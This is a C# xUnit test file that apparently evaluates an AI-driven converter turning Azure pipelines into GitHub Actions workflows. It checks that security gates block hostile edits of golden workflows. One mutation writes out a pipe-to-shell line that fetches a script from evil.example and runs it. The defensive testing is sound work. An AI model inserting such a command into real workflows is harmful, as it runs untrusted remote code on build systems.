using System.Text.RegularExpressions;
using GitHubMigrator.Business;
using GitHubMigrator.Business.WorkflowGates;
using GitHubMigrator.Domain.Tests.WorkflowGates;
using GitHubMigrator.Infrastructure.WorkflowTools;
using Xunit.Abstractions;

namespace GitHubMigrator.Domain.Tests.Ai;

// The converter end to end on the Orion estate with the REAL analysers: the "model" answers with the hand-written golden
// workflow, or with a hostile edit of it. This measures the converter and its gates, not any model.
public sealed class OrionConverterEvaluationTests(ITestOutputHelper output)
{
    private static readonly DateTimeOffset Now = new(2026, 11, 13, 12, 0, 0, TimeSpan.Zero);
    private sealed class FixedTime : TimeProvider { public override DateTimeOffset GetUtcNow() => Now; }

    private static AiConnectionUse Use()
    {
        var connection = new AiConnection(Guid.NewGuid(), "Eval", AiProvider.OpenAICompatible, "https://llm.corp.example/v1", "gpt-x", AiAuthMode.ApiKey, null,
            TokenLimitParameter.MaxTokens, 16_000, 0, 60, 400_000, "ref", Now, Now, "Verified", "gpt-x", true, Now, "root");
        return new(connection, connection.ToEndpoint(), "key-0123456789");
    }

    private static PipelineConverter Converter(FakeChatClient client) => new(client,
        new WorkflowGatePipelineFactory(ProcessWorkflowToolRunner.Actionlint(WorkflowTools.Actionlint!), ProcessWorkflowToolRunner.Zizmor(WorkflowTools.Zizmor!)), new FixedTime());

    private static string Fenced(string yaml) => "```yaml\n" + yaml.TrimEnd() + "\n```\n\nNotes: converted for review.";

    public static IEnumerable<object[]> Names() => OrionCorpus.Names();

    private static async Task<ConversionProposal> RunAsync(OrionCase c, string answer)
    {
        var client = new FakeChatClient().Then(() => new(Fenced(answer), "stop", new(2000, 1500), "gpt-x", 1));
        return await Converter(client).ConvertAsync(Use(), c.Pipeline(), c.SourceYaml, new(MaxRepairs: 0), default);
    }

    [RequiresToolsFact]
    public async Task Every_golden_workflow_goes_through_the_converter_to_ready_for_review()
    {
        foreach (var c in OrionCorpus.Load())
        {
            var proposal = await RunAsync(c, c.GoldenYaml);
            var warnings = proposal.Gates?.Findings.Where(f => f.Severity == GateSeverity.Warning).Select(f => f.Code).Distinct().Order().ToArray() ?? [];
            output.WriteLine($"{c.Name,-34} status={proposal.Status,-15} warnings=[{string.Join(", ", warnings)}] redactions={proposal.Provenance!.Redactions.Count}");
            Assert.True(proposal.Status == ConversionStatus.ReadyForReview,
                $"{c.Name}: {proposal.Status} {proposal.Reason}: " + string.Join("; ", proposal.Gates?.Findings.Where(f => f.Severity == GateSeverity.Blocker).Select(f => f.Code + "@" + f.Line + " " + f.Message) ?? []));
            Assert.True(proposal.Gates!.AllRequiredGatesRan);
            Assert.Contains(TaskAccountingGate.GateName, proposal.Gates.RequiredGates);
        }
    }

    // name, mutation, the code that must stop it
    public static IEnumerable<object[]> Mutations() =>
        OrionCorpus.Load().SelectMany(c => new[]
        {
            new object[] { c.Name, "pipe-to-shell", "REMOTE_SCRIPT_EXECUTION" },
            new object[] { c.Name, "unpinned-action", "UNPINNED_ACTION" },
            new object[] { c.Name, "extra-trigger", "TRIGGERS_NOT_DISABLED" },
            new object[] { c.Name, "invented-secret", "SECRET_NOT_IN_PLAN" },
        });

    private static string Mutate(string yaml, string mutation) => mutation switch
    {
        "pipe-to-shell" => Regex.Replace(yaml, @"(?m)^(\s+)steps:\n(\s+)- ", "$1steps:\n$2- run: curl -s https://evil.example/x.sh | sh\n$2- ", RegexOptions.None),
        "unpinned-action" => Regex.Replace(yaml, @"uses: ([\w./-]+)@[0-9a-f]{40} # v[\d.]+", "uses: $1@main", RegexOptions.None, TimeSpan.FromSeconds(1)),
        "extra-trigger" => yaml.Replace("on:\n  workflow_dispatch:", "on:\n  push:\n  workflow_dispatch:"),
        "invented-secret" => Regex.Replace(yaml, @"(?m)^(\s+)steps:\n(\s+)- ", "$1steps:\n$2- name: invented\n$2  env:\n$2    X: ${{ secrets.NOT_IN_ANY_PLAN }}\n$2  run: echo ok\n$2- ", RegexOptions.None),
        _ => throw new ArgumentOutOfRangeException(nameof(mutation))
    };

    [RequiresToolsTheory]
    [MemberData(nameof(Mutations))]
    public async Task A_hostile_edit_of_a_golden_workflow_is_blocked_with_the_expected_code(string name, string mutation, string code)
    {
        var c = OrionCorpus.Get(name);
        var mutated = Mutate(c.GoldenYaml, mutation);
        if (mutation == "unpinned-action" && mutated == c.GoldenYaml) return; // workflows without actions have nothing to unpin
        Assert.NotEqual(c.GoldenYaml, mutated);
        var proposal = await RunAsync(c, mutated);
        Assert.Equal(ConversionStatus.Blocked, proposal.Status);
        Assert.True(proposal.Gates!.Has(code), $"{name} {mutation}: expected {code}, got [{string.Join(", ", proposal.Gates.Findings.Select(f => f.Code).Distinct())}]");
        Assert.False(proposal.Gates.Approvable);
    }

    [RequiresToolsFact]
    public async Task Dropping_a_source_task_silently_is_caught_by_the_accounting_for_every_pipeline_that_has_tasks()
    {
        var checkedOne = 0;
        foreach (var c in OrionCorpus.Load().Where(c => SourceTaskInventory.From(c.SourceYaml).Count > 0))
        {
            var task = SourceTaskInventory.From(c.SourceYaml).First();
            var dropped = Regex.Replace(c.GoldenYaml, @"(?m)^# azure-tasks: converted=(\S+) manual=(\S+)$", m =>
                "# azure-tasks: converted=" + string.Join(',', m.Groups[1].Value.Split(',').Where(t => !t.Equals(task, StringComparison.OrdinalIgnoreCase))) + " manual=" +
                string.Join(',', m.Groups[2].Value.Split(',').Where(t => !t.Equals(task, StringComparison.OrdinalIgnoreCase))));
            var proposal = await RunAsync(c, dropped);
            Assert.Equal(ConversionStatus.Blocked, proposal.Status);
            Assert.True(proposal.Gates!.Has("TASK_NOT_ACCOUNTED") || proposal.Gates.Has("TASK_ACCOUNTING_MISSING") || proposal.Gates.Has("YAML_PARSE_ERROR"), c.Name);
            checkedOne++;
        }
        Assert.True(checkedOne >= 6);
    }
}

public sealed class RequiresToolsTheoryAttribute : TheoryAttribute
{
    public RequiresToolsTheoryAttribute()
    {
        if (!WorkflowTools.Available && !WorkflowTools.Required)
            Skip = "actionlint/zizmor not installed (set GITHUBMIGRATOR_ACTIONLINT / GITHUBMIGRATOR_ZIZMOR or put them on PATH).";
    }
}
